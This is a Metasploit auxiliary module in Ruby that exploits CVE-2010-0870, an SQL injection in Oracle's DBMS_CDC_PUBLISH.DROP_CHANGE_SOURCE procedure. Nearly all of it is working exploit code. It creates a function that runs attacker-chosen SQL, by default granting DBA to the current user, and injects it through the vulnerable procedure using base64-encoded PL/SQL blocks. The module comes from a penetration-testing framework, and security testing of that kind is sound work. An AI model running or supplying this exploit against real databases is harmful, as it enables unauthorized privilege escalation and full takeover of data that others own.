##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE',
        'Description' => %q{
          The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE
          procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege
          on the vulnerable package can exploit this vulnerability. By default, users granted
          EXECUTE_CATALOG_ROLE have the required privilege.
        },
        'Author' => [ 'MC' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2010-0870' ],
          [ 'OSVDB', '63772'],
          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2010.html' ]
        ],
        'DisclosureDate' => '2010-04-26',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
      ]
    )
  end

  def run
    return if !check_dependencies

    name = Rex::Text.rand_text_alpha_upper(1..10)
    var1 = Rex::Text.rand_text_alpha_upper(1..10)
    var2 = Rex::Text.rand_text_alpha_upper(1..10)

    function = "
CREATE OR REPLACE FUNCTION #{name}
RETURN VARCHAR2 AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE '#{datastore['SQL']}';
COMMIT;
RETURN NULL;
END;
    "

    package = "
BEGIN
SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE('''||'||user||'.#{name}||''');
END;
    "

    uno = Rex::Text.encode_base64(function)
    dos = Rex::Text.encode_base64(package)

    encoded_sql = %|
DECLARE
#{var1} VARCHAR2(32767);
#{var2} VARCHAR2(32767);
BEGIN
#{var1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{uno}')));
EXECUTE IMMEDIATE #{var1};
#{var2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));
EXECUTE IMMEDIATE #{var2};
END;
    |

    print_status('Attempting sql injection on SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE...')
    prepare_exec(encoded_sql)
    print_status('Done...')
  end
end
